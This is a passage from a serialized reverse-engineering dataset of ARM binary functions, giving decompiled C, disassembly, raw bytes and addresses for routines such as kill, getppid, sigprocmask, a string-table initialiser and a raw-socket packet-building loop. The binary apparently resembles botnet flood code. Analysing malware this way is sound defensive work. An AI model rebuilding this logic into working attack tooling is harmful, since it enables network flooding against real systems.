r1,r2,#0xff00\norr r3,r3,r1, lsl #0x8\norr r3,r3,r2, lsl #0x18\nstr r3,[r5,#0x10]\nldr r3,[sp,#0x60]\ncmn r3,#0x1\nbne 0x00009748\nbl 0x0000a308\nmov r4,#0x10000\nstr r0,[r5,#0xc]\nldr r0,[sp,#0x4c]\nsub r4,r4,#0x1\ncmp r0,r4\nbne 0x0000975c\nbl 0x0000a308\nldr r1,[sp,#0x58]\ncmp r1,r4\nstrh r0,[r5,#0x4]\nbne 0x00009768\nbl 0x0000a308\nldr r2,[sp,#0x5c]\ncmp r2,r4\nstrh r0,[r5,#0x14]\nbne 0x00009774\nbl 0x0000a308\nldr r3,[sp,#0x28]\ncmp r3,r4\nstrh r0,[r6,#0x2]\nbne 0x00009780\nbl 0x0000a308\nstr r0,[r6,#0x4]\nldr r0,[sp,#0x2c]\ncmp r0,r4\nbne 0x0000978c\nbl 0x0000a308\ncmp r11,#0x0\nstr r0,[r6,#0x8]\nbeq 0x00009794\nbl 0x0000a308\nstrh r0,[r6,#0x12]\nb 0x00009794\ncpy r0,r10\nbl 0x00008a58\nadd sp,sp,#0x74\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nbx lr\n'
p389
S'f0 4f 2d e9\n01 80 a0 e1\n74 d0 4d e2\n04 10 a0 e3\n02 40 a0 e1\n03 50 a0 e1\n00 70 a0 e1\nb1 fd ff eb\n05 10 a0 e1\n02 20 a0 e3\n00 30 a0 e3\n00 90 a0 e1\n04 00 a0 e1\nfc fe ff eb\n01 38 a0 e3\n00 c0 a0 e1\nff c0 0c e2\n01 30 43 e2\n03 20 a0 e3\n05 10 a0 e1\n04 00 a0 e1\n48 c0 8d e5\nf3 fe ff eb\n05 10 a0 e1\n24 00 8d e5\n04 20 a0 e3\n40 30 a0 e3\n04 00 a0 e1\ned fe ff eb\n00 c0 a0 e1\nff c0 0c e2\n05 10 a0 e1\n05 20 a0 e3\n01 30 a0 e3\n04 00 a0 e1\n50 c0 8d e5\ne5 fe ff eb\n01 38 a0 e3\n00 c0 a0 e1\nff c0 0c e2\n01 30 43 e2\n06 20 a0 e3\n05 10 a0 e1\n04 00 a0 e1\n54 c0 8d e5\ndc fe ff eb\n01 38 a0 e3\n05 10 a0 e1\n01 30 43 e2\n07 20 a0 e3\n00 b0 a0 e1\n04 00 a0 e1\nd5 fe ff eb\n01 38 a0 e3\n05 10 a0 e1\n01 30 43 e2\n11 20 a0 e3\n00 60 a0 e1\n04 00 a0 e1\nce fe ff eb\n05 10 a0 e1\n28 00 8d e5\n12 20 a0 e3\n00 30 a0 e3\n04 00 a0 e1\nc8 fe ff eb\n05 10 a0 e1\n2c 00 8d e5\n0b 20 a0 e3\n00 30 a0 e3\n04 00 a0 e1\nc2 fe ff eb\n05 10 a0 e1\n30 00 8d e5\n0c 20 a0 e3\n00 30 a0 e3\n04 00 a0 e1\nbc fe ff eb\n05 10 a0 e1\n34 00 8d e5\n0d 20 a0 e3\n00 30 a0 e3\n04 00 a0 e1\nb6 fe ff eb\n05 10 a0 e1\n38 00 8d e5\n0e 20 a0 e3\n00 30 a0 e3\n04 00 a0 e1\nb0 fe ff eb\n05 10 a0 e1\n3c 00 8d e5\n0f 20 a0 e3\n01 30 a0 e3\n04 00 a0 e1\naa fe ff eb\n05 10 a0 e1\n40 00 8d e5\n10 20 a0 e3\n00 30 a0 e3\n04 00 a0 e1\na4 fe ff eb\n08 25 9f e5\n44 00 8d e5\n00 30 92 e5\n05 10 a0 e1\n19 20 a0 e3\n04 00 a0 e1\n82 fe ff eb\n03 10 a0 e3\n60 00 8d e5\n06 20 a0 e3\n02 00 a0 e3\n38 fd ff eb\n01 00 70 e3\n00 a0 a0 e1\n31 01 00 0a\n70 30 8d e2\n01 20 a0 e3\n04 20 23 e5\n04 c0 a0 e3\n00 10 a0 e3\n02 20 82 e2\n00 c0 8d e5\n4b fd ff eb\n01 00 70 e3\n25 01 00 0a\n24 10 9d e5\n00 20 a0 e3\n01 08 a0 e1\n0b 48 a0 e1\n06 58 a0 e1\n6c 20 8d e5\n30 20 9d e5\n20 38 a0 e1\n24 68 a0 e1\n25 18 a0 e1\n00 00 57 e3\n4c 30 8d e5\n58 60 8d e5\n5c 10 8d e5\nff b0 02 e2\n92 00 00 0a\n28 30 9d e5\n03 e8 a0 e1\n06 3c a0 e1\n4c 60 9d e5\n01 2c a0 e1\n0e 14 a0 e1\n21 18 a0 e1\n20 0c a0 e1\nff c0 06 e2\n2e ec 81 e1\n0c c4 80 e1\n30 00 8d e2\n03 00 90 e8\n23 38 a0 e1\n22 28 a0 e1\n01 00 00 e2\n01 10 01 e2\n24 6c 83 e1\n25 5c 82 e1\n0c 00 8d e5\n10 10 8d e5\n38 20 8d e2\n0c 00 92 e8\n40 00 8d e2\n03 00 90 e8\n01 20 02 e2\n01 30 03 e2\n01 00 00 e2\n01 10 01 e2\n64 e0 8d e5\n08 c0 8d e5\n14 20 8d e5\n18 30 8d e5\n1c 00 8d e5\n20 10 8d e5\n00 40 a0 e3\n01 10 a0 e3\n80 00 a0 e3\n03 fd ff eb\n6c 20 9d e5\n04 01 89 e7\n82 32 a0 e1\n02 41 99 e7\n82 31 43 e0\n08 00 83 e0\n00 30 d4 e5\nb0 30 c3 e3\n40 30 83 e3\n00 30 c4 e5\n00 20 d4 e5\n0a 20 c2 e3\n05 20 82 e3\n54 30 9d e5\n00 20 c4 e5\n48 10 9d e5\n01 10 c4 e5\n50 20 9d e5\n00 00 53 e3\n0f 3b a0 e3\n08 20 c4 e5\nb2 30 c4 e1\n06 30 a0 e3\n08 10 9d e5\n40 20 a0 13\n09 30 c4 e5\nb6 20 c4 11\n60 20 9d e5\n0c 20 84 e5\n10 30 90 e5\nb4 10 c4 e1\n10 30 84 e5\nb4 61 c4 e1\n14 10 84 e2\n0c 30 d1 e5\n0d 20 d1 e5\n0c 00 9d e5\n50 30 c3 e3\na0 30 83 e3\n20 20 c2 e3\n0c 30 c1 e5\n80 22 82 e1\n64 30 9d e5\n0d 20 c1 e5\n04 30 81 e5\n0d 30 d1 e5\n10 00 9d e5\n10 30 c3 e3\n00 32 83 e1\n0d 30 c1 e5\n0d 20 d1 e5\n14 30 9d e5\n08 20 c2 e3\n83 21 82 e1\nb2 50 c1 e1\n0d 20 c1 e5\n0d 30 d1 e5\n18 00 9d e5\n04 30 c3 e3\n00 31 83 e1\n0d 30 c1 e5\n0d 20 d1 e5\n1c 30 9d e5\n02 20 c2 e3\n83 20 82 e1\n0d 20 c1 e5\n0d 30 d1 e5\n20 00 9d e5\n01 30 c3 e3\n03 30 80 e1\n0d 30 c1 e5\n04 20 a0 e3\n02 10 a0 e3\n28 10 c4 e5\n29 20 c4 e5\n1f 03 00 eb\n0f 00 00 e2\n57 0e 80 e2\n08 00 80 e2\n00 08 a0 e1\n20 34 a0 e1\nff 3c 03 e2\n20 3c 83 e1\nba 32 c4 e1\n04 30 a0 e3\n2c 30 c4 e5\n0a 20 a0 e3\n08 30 a0 e3\n02 00 a0 e3\n2e 30 c4 e5\n2f 20 c4 e5\n2d 00 c4 e5\n0e 03 00 eb\n06 20 a0 e3\n3b 20 c4 e5\n03 10 a0 e3\n00 30 a0 e3\n01 20 a0 e3\n30 00 84 e5\n34 30 84 e5\n38 20 c4 e5\n3a 10 c4 e5\n39 10 c4 e5\n6c 30 9d e5\n02 40 83 e0\n07 00 54 e1\n6c 40 8d e5\n90 ff ff ba\n00 30 a0 e3\n00 00 57 e3\n6c 30 8d e5\nfb ff ff 0a\n03 00 a0 e1\n80 32 a0 e1\n80 31 43 e0\n08 30 83 e0\n14 20 d3 e5\n00 51 99 e7\n1f 00 52 e3\n14 60 85 e2\n3b 00 00 9a\n60 30 9d e5\n01 00 73 e3\n50 00 00 0a\n01 48 a0 e3\n4c 00 9d e5\n01 40 44 e2\n04 00 50 e1\n52 00 00 0a\n58 10 9d e5\n04 00 51 e1\n54 00 00 0a\n5c 20 9d e5\n04 00 52 e1\n56 00 00 0a\n28 30 9d e5\n04 00 53 e1\n58 00 00 0a\n2c 00 9d e5\n04 00 50 e1\n5a 00 00 0a\n00 00 5b e3\n5c 00 00 1a\n00 10 a0 e3\nba 10 c5 e1\n05 00 a0 e1\n14 10 a0 e3\n60 00 00 eb\n00 20 a0 e3\nba 00 c5 e1\n06 10 a0 e1\nb0 21 c6 e1\n28 30 a0 e3\n0a 2b a0 e3\n05 00 a0 e1\n6c 00 00 eb\n6c 30 9d e5\n83 e2 a0 e1\nb0 01 c6 e1\n83 e1 4e e0\nb2 60 d6 e1\n08 e0 8e e0\nb2 60 ce e1\n01 39 a0 e3\n10 c0 a0 e3\n05 10 a0 e1\n0a 00 a0 e1\n3c 20 a0 e3\n00 e0 8d e5\n04 c0 8d e5\n6d fc ff eb\n6c 30 9d e5\n01 00 83 e2\n07 00 50 e1\n6c 00 8d e5\nc0 ff ff ba\n00 30 a0 e3\n00 00 57 e3\n6c 30 8d e5\nb7 ff ff 0a\nba ff ff ea\n10 40 93 e5\nb4 02 00 eb\n6c 30 9d e5\n83 12 a0 e1\n83 11 41 e0\nff c8 04 e2\n24 2c a0 e1\n2c 24 82 e1\n08 10 81 e0\nff 3c 04 e2\n14 c0 d1 e5\n03 24 82 e1\n04 2c 82 e1\n30 2c 82 e0\nff 08 02 e2\n22 3c a0 e1\n20 34 83 e1\nff 1c 02 e2\n01 34 83 e1\n02 3c 83 e1\n10 30 85 e5\n60 30 9d e5\n01 00 73 e3\nae ff ff 1a\n9d 02 00 eb\n01 48 a0 e3\n0c 00 85 e5\n4c 00 9d e5\n01 40 44 e2\n04 00 50 e1\nac ff ff 1a\n96 02 00 eb\n58 10 9d e5\n04 00 51 e1\nb4 00 c5 e1\naa ff ff 1a\n91 02 00 eb\n5c 20 9d e5\n04 00 52 e1\nb4 01 c5 e1\na8 ff ff 1a\n8c 02 00 eb\n28 30 9d e5\n04 00 53 e1\nb2 00 c6 e1\na6 ff ff 1a\n87 02 00 eb\n04 00 86 e5\n2c 00 9d e5\n04 00 50 e1\na4 ff ff 1a\n82 02 00 eb\n00 00 5b e3\n08 00 86 e5\na2 ff ff 0a\n7e 02 00 eb\nb2 01 c6 e1\n9f ff ff ea\n0a 00 a0 e1\n4e fc ff eb\n74 d0 8d e2\nf0 4f bd e8\n1e ff 2f e1\n'
p390
S'.text:00009280\n.text:00009284\n.text:00009288\n.text:0000928c\n.text:00009290\n.text:00009294\n.text:00009298\n.text:0000929c\n.text:000092a0\n.text:000092a4\n.text:000092a8\n.text:000092ac\n.text:000092b0\n.text:000092b4\n.text:000092b8\n.text:000092bc\n.text:000092c0\n.text:000092c4\n.text:000092c8\n.text:000092cc\n.text:000092d0\n.text:000092d4\n.text:000092d8\n.text:000092dc\n.text:000092e0\n.text:000092e4\n.text:000092e8\n.text:000092ec\n.text:000092f0\n.text:000092f4\n.text:000092f8\n.text:000092fc\n.text:00009300\n.text:00009304\n.text:00009308\n.text:0000930c\n.text:00009310\n.text:00009314\n.text:00009318\n.text:0000931c\n.text:00009320\n.text:00009324\n.text:00009328\n.text:0000932c\n.text:00009330\n.text:00009334\n.text:00009338\n.text:0000933c\n.text:00009340\n.text:00009344\n.text:00009348\n.text:0000934c\n.text:00009350\n.text:00009354\n.text:00009358\n.text:0000935c\n.text:00009360\n.text:00009364\n.text:00009368\n.text:0000936c\n.text:00009370\n.text:00009374\n.text:00009378\n.text:0000937c\n.text:00009380\n.text:00009384\n.text:00009388\n.text:0000938c\n.text:00009390\n.text:00009394\n.text:00009398\n.text:0000939c\n.text:000093a0\n.text:000093a4\n.text:000093a8\n.text:000093ac\n.text:000093b0\n.text:000093b4\n.text:000093b8\n.text:000093bc\n.text:000093c0\n.text:000093c4\n.text:000093c8\n.text:000093cc\n.text:000093d0\n.text:000093d4\n.text:000093d8\n.text:000093dc\n.text:000093e0\n.text:000093e4\n.text:000093e8\n.text:000093ec\n.text:000093f0\n.text:000093f4\n.text:000093f8\n.text:000093fc\n.text:00009400\n.text:00009404\n.text:00009408\n.text:0000940c\n.text:00009410\n.text:00009414\n.text:00009418\n.text:0000941c\n.text:00009420\n.text:00009424\n.text:00009428\n.text:0000942c\n.text:00009430\n.text:00009434\n.text:00009438\n.text:0000943c\n.text:00009440\n.text:00009444\n.text:00009448\n.text:0000944c\n.text:00009450\n.text:00009454\n.text:00009458\n.text:0000945c\n.text:00009460\n.text:00009464\n.text:00009468\n.text:0000946c\n.text:00009470\n.text:00009474\n.text:00009478\n.text:0000947c\n.text:00009480\n.text:00009484\n.text:00009488\n.text:0000948c\n.text:00009490\n.text:00009494\n.text:00009498\n.text:0000949c\n.text:000094a0\n.text:000094a4\n.text:000094a8\n.text:000094ac\n.text:000094b0\n.text:000094b4\n.text:000094b8\n.text:000094bc\n.text:000094c0\n.text:000094c4\n.text:000094c8\n.text:000094cc\n.text:000094d0\n.text:000094d4\n.text:000094d8\n.text:000094dc\n.text:000094e0\n.text:000094e4\n.text:000094e8\n.text:000094ec\n.text:000094f0\n.text:000094f4\n.text:000094f8\n.text:000094fc\n.text:00009500\n.text:00009504\n.text:00009508\n.text:0000950c\n.text:00009510\n.text:00009514\n.text:00009518\n.text:0000951c\n.text:00009520\n.text:00009524\n.text:00009528\n.text:0000952c\n.text:00009530\n.text:00009534\n.text:00009538\n.text:0000953c\n.text:00009540\n.text:00009544\n.text:00009548\n.text:0000954c\n.text:00009550\n.text:00009554\n.text:00009558\n.text:0000955c\n.text:00009560\n.text:00009564\n.text:00009568\n.text:0000956c\n.text:00009570\n.text:00009574\n.text:00009578\n.text:0000957c\n.text:00009580\n.text:00009584\n.text:00009588\n.text:0000958c\n.text:00009590\n.text:00009594\n.text:00009598\n.text:0000959c\n.text:000095a0\n.text:000095a4\n.text:000095a8\n.text:000095ac\n.text:000095b0\n.text:000095b4\n.text:000095b8\n.text:000095bc\n.text:000095c0\n.text:000095c4\n.text:000095c8\n.text:000095cc\n.text:000095d0\n.text:000095d4\n.text:000095d8\n.text:000095dc\n.text:000095e0\n.text:000095e4\n.text:000095e8\n.text:000095ec\n.text:000095f0\n.text:000095f4\n.text:000095f8\n.text:000095fc\n.text:00009600\n.text:00009604\n.text:00009608\n.text:0000960c\n.text:00009610\n.text:00009614\n.text:00009618\n.text:0000961c\n.text:00009620\n.text:00009624\n.text:00009628\n.text:0000962c\n.text:00009630\n.text:00009634\n.text:00009638\n.text:0000963c\n.text:00009640\n.text:00009644\n.text:00009648\n.text:0000964c\n.text:00009650\n.text:00009654\n.text:00009658\n.text:0000965c\n.text:00009660\n.text:00009664\n.text:00009668\n.text:0000966c\n.text:00009670\n.text:00009674\n.text:00009678\n.text:0000967c\n.text:00009680\n.text:00009684\n.text:00009688\n.text:0000968c\n.text:00009690\n.text:00009694\n.text:00009698\n.text:0000969c\n.text:000096a0\n.text:000096a4\n.text:000096a8\n.text:000096ac\n.text:000096b0\n.text:000096b4\n.text:000096b8\n.text:000096bc\n.text:000096c0\n.text:000096c4\n.text:000096c8\n.text:000096cc\n.text:000096d0\n.text:000096d4\n.text:000096d8\n.text:000096dc\n.text:000096e0\n.text:000096e4\n.text:000096e8\n.text:000096ec\n.text:000096f0\n.text:000096f4\n.text:000096f8\n.text:000096fc\n.text:00009700\n.text:00009704\n.text:00009708\n.text:0000970c\n.text:00009710\n.text:00009714\n.text:00009718\n.text:0000971c\n.text:00009720\n.text:00009724\n.text:00009728\n.text:0000972c\n.text:00009730\n.text:00009734\n.text:00009738\n.text:0000973c\n.text:00009740\n.text:00009744\n.text:00009748\n.text:0000974c\n.text:00009750\n.text:00009754\n.text:00009758\n.text:0000975c\n.text:00009760\n.text:00009764\n.text:00009768\n.text:0000976c\n.text:00009770\n.text:00009774\n.text:00009778\n.text:0000977c\n.text:00009780\n.text:00009784\n.text:00009788\n.text:0000978c\n.text:00009790\n.text:00009794\n.text:00009798\n.text:0000979c\n.text:000097a0\n.text:000097a4\n.text:000097a8\n.text:000097ac\n.text:000097b0\n.text:000097b4\n.text:000097b8\n.text:000097bc\n.text:000097c0\n.text:000097c4\n.text:000097c8\n.text:000097cc\n.text:000097d0\n.text:000097d4\n.text:000097d8\n.text:000097dc\n.text:000097e0\n.text:000097e4\n.text:000097e8\n.text:000097ec\n.text:000097f0\n.text:000097f4\n.text:000097f8\n.text:000097fc\n.text:00009800\n.text:00009804\n.text:00009808\n.text:0000980c\n.text:00009810\n.text:00009814\n.text:00009818\n.text:0000981c\n.text:00009820\n.text:00009824\n.text:00009828\n.text:0000982c\n.text:00009830\n.text:00009834\n.text:00009838\n.text:0000983c\n.text:00009840\n.text:00009844\n.text:00009848\n.text:0000984c\n.text:00009850\n.text:00009854\n.text:00009858\n.text:0000985c\n.text:00009860\n.text:00009864\n.text:00009868\n.text:0000986c\n.text:00009870\n.text:00009874\n.text:00009878\n.text:0000987c\n.text:00009880\n.text:00009884\n.text:00009888\n.text:0000988c\n.text:00009890\n.text:00009894\n.text:00009898\n.text:0000989c\n.text:000098a0\n.text:000098a4\n.text:000098a8\n.text:000098ac\n.text:000098b0\n.text:000098b4\n.text:000098b8\n.text:000098bc\n.text:000098c0\n.text:000098c4\n.text:000098c8\n.text:000098cc\n.text:000098d0\n.text:000098d4\n.text:000098d8\n.text:000098dc\n.text:000098e0\n.text:000098e4\n.text:000098e8\n.text:000098ec\n.text:000098f0\n.text:000098f4\n.text:000098f8\n.text:000098fc\n.text:00009900\n.text:00009904\n.text:00009908\n.text:0000990c\n.text:00009910\n.text:00009914\n.text:00009918\n.text:0000991c\n.text:00009920\n.text:00009924\n'
p391
tp392
sS'getppid'
p393
(S'\n__stdcall getppid()\n'
p394
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__pid_t getppid(void)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089f4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  _Var1 = (*(code *)PTR_LAB_000132f0)();\u000a  return _Var1;\u000a}\u000a\u000a
p395
S'adr r12,0x89f4\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8fc]!\n'
p396
S'00 c6 8f e2\n0a ca 8c e2\nfc f8 bc e5\n'
p397
S'.plt:000089ec\n.plt:000089f0\n.plt:000089f4\n'
p398
tp399
sS'FUN_0000ac88'
p400
(S'\n__stdcall FUN_0000ac88()\n'
p401
V\u000avoid FUN_0000ac88(int iParm1,int iParm2)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a  if (iParm2 == 0) {\u000a    return;\u000a  }\u000a  iVar1 = 0;\u000a  do {\u000a    *(undefined *)(iVar1 + iParm1) = 0;\u000a    iVar1 = iVar1 + 1;\u000a  } while (iVar1 != iParm2);\u000a  return;\u000a}\u000a\u000a
p402
S'cmp r1,#0x0\nbxeq lr\nmov r2,#0x0\nmov r3,#0x0\nstrb r3,[r2,r0]\nadd r2,r2,#0x1\ncmp r2,r1\nbne 0x0000ac94\nbx lr\n'
p403
S'00 00 51 e3\n1e ff 2f 01\n00 20 a0 e3\n00 30 a0 e3\n00 30 c2 e7\n01 20 82 e2\n01 00 52 e1\nfa ff ff 1a\n1e ff 2f e1\n'
p404
S'.text:0000ac88\n.text:0000ac8c\n.text:0000ac90\n.text:0000ac94\n.text:0000ac98\n.text:0000ac9c\n.text:0000aca0\n.text:0000aca4\n.text:0000aca8\n'
p405
tp406
sS'kill'
p407
(S'\n__stdcall kill(__pid_t __pid, int __sig)\n'
p408
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint kill(__pid_t __pid,int __sig)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008988. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132cc)();\u000a  return iVar1;\u000a}\u000a\u000a
p409
S'adr r12,0x8988\nadd r12,r12,#0xa000\nldr pc,[r12,#0x944]!\n'
p410
S'00 c6 8f e2\n0a ca 8c e2\n44 f9 bc e5\n'
p411
S'.plt:00008980\n.plt:00008984\n.plt:00008988\n'
p412
tp413
sS'sigprocmask'
p414
(S'\n__stdcall sigprocmask(int __how, sigset_t * __set, sigset_t * __oset)\n'
p415
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint sigprocmask(int __how,sigset_t *__set,sigset_t *__oset)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a84. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013320)();\u000a  return iVar1;\u000a}\u000a\u000a
p416
S'adr r12,0x8a84\nadd r12,r12,#0xa000\nldr pc,[r12,#0x89c]!\n'
p417
S'00 c6 8f e2\n0a ca 8c e2\n9c f8 bc e5\n'
p418
S'.plt:00008a7c\n.plt:00008a80\n.plt:00008a84\n'
p419
tp420
sS'FUN_0000a6dc'
p421
(S'\n__stdcall FUN_0000a6dc()\n'
p422
V\u000avoid FUN_0000a6dc(void)\u000a\u000a{\u000a  undefined *puVar1;\u000a  void *pvVar2;\u000a  \u000a  pvVar2 = malloc(0x21);\u000a  puVar1 = PTR_DAT_0000ab6c;\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab70,0x21);\u000a  *(void **)(puVar1 + 0x18) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x1c) = 0x21;\u000a  pvVar2 = malloc(6);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab74,6);\u000a  *(void **)(puVar1 + 0x20) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x24) = 6;\u000a  pvVar2 = malloc(7);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab78,7);\u000a  *(void **)(puVar1 + 0x28) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x2c) = 7;\u000a  pvVar2 = malloc(7);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab7c,7);\u000a  *(void **)(puVar1 + 0x30) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x34) = 7;\u000a  pvVar2 = malloc(3);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab80,3);\u000a  *(undefined2 *)(puVar1 + 0x3c) = 3;\u000a  *(void **)(puVar1 + 0x38) = pvVar2;\u000a  pvVar2 = malloc(0x14);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab84,0x14);\u000a  *(void **)(puVar1 + 0x40) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x44) = 0x14;\u000a  pvVar2 = malloc(0x19);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab88,0x19);\u000a  *(undefined2 *)(puVar1 + 0x4c) = 0x19;\u000a  *(void **)(puVar1 + 0x48) = pvVar2;\u000a  pvVar2 = malloc(9);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab8c,9);\u000a  *(void **)(puVar1 + 0x50) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x54) = 9;\u000a  pvVar2 = malloc(0x10);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab90,0x10);\u000a  *(undefined2 *)(puVar1 + 0x5c) = 0x10;\u000a  *(void **)(puVar1 + 0x58) = pvVar2;\u000a  pvVar2 = malloc(0x16);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab94,0x16);\u000a  *(void **)(puVar1 + 0x60) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 100) = 0x16;\u000a  pvVar2 = malloc(5);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab98,5);\u000a  *(void **)(puVar1 + 0x68) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x6c) = 5;\u000a  pvVar2 = malloc(6);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000ab9c,6);\u000a  *(void **)(puVar1 + 0x70) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x74) = 6;\u000a  pvVar2 = malloc(8);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000aba0,8);\u000a  *(void **)(puVar1 + 0x78) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x7c) = 8;\u000a  pvVar2 = malloc(7);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000aba4,7);\u000a  *(void **)(puVar1 + 0x80) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x84) = 7;\u000a  pvVar2 = malloc(5);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000aba8,5);\u000a  *(void **)(puVar1 + 0x88) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x8c) = 5;\u000a  pvVar2 = malloc(4);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abac,4);\u000a  *(undefined2 *)(puVar1 + 0x94) = 4;\u000a  *(void **)(puVar1 + 0x90) = pvVar2;\u000a  pvVar2 = malloc(6);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abb0,6);\u000a  *(void **)(puVar1 + 0x98) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x9c) = 6;\u000a  pvVar2 = malloc(0xe);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abb4,0xe);\u000a  *(void **)(puVar1 + 0xa0) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0xa4) = 0xe;\u000a  pvVar2 = malloc(10);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abb8,10);\u000a  *(void **)(puVar1 + 0xa8) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0xac) = 10;\u000a  pvVar2 = malloc(7);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abbc,7);\u000a  *(void **)(puVar1 + 0xb0) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0xb4) = 7;\u000a  pvVar2 = malloc(5);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abc0,5);\u000a  *(void **)(puVar1 + 0xb8) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0xbc) = 5;\u000a  pvVar2 = malloc(5);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abc4,5);\u000a  *(void **)(puVar1 + 0xc0) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0xc4) = 5;\u000a  pvVar2 = malloc(5);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abc8,5);\u000a  *(undefined2 *)(puVar1 + 0xcc) = 5;\u000a  *(void **)(puVar1 + 200) = pvVar2;\u000a  pvVar2 = malloc(8);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abcc,8);\u000a  *(void **)(puVar1 + 0xd8) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0xdc) = 8;\u000a  pvVar2 = malloc(10);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abd0,10);\u000a  *(void **)(puVar1 + 0xd0) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0xd4) = 10;\u000a  pvVar2 = malloc(10);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abd4,10);\u000a  *(void **)(puVar1 + 0xe0) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0xe4) = 10;\u000a  pvVar2 = malloc(0xe);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abd8,0xe);\u000a  *(void **)(puVar1 + 0xe8) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0xec) = 0xe;\u000a  pvVar2 = malloc(0x13);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abdc,0x13);\u000a  *(void **)(puVar1 + 0xf0) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0xf4) = 0x13;\u000a  pvVar2 = malloc(0x17);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abe0,0x17);\u000a  *(undefined2 *)(puVar1 + 0xfc) = 0x17;\u000a  *(void **)(puVar1 + 0xf8) = pvVar2;\u000a  pvVar2 = malloc(0x18);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abe4,0x18);\u000a  *(undefined2 *)(puVar1 + 0x104) = 0x18;\u000a  *(void **)(puVar1 + 0x100) = pvVar2;\u000a  pvVar2 = malloc(0x30);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abe8,0x30);\u000a  *(undefined2 *)(puVar1 + 0x10c) = 0x30;\u000a  *(void **)(puVar1 + 0x108) = pvVar2;\u000a  pvVar2 = malloc(0x11);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abec,0x11);\u000a  *(undefined2 *)(puVar1 + 0x11c) = 0x11;\u000a  *(void **)(puVar1 + 0x118) = pvVar2;\u000a  pvVar2 = malloc(0xb);\u000a  FUN_0000ac64(pvVar2,PTR_DAT_0000abf0,0xb);\u000a  *(void **)(puVar1 + 0x120) = pvVar2;\u000a  *(undefined2 *)(puVar1 + 0x124) = 0xb;\u000a  return;\u000a}\u000a\u000a
p423
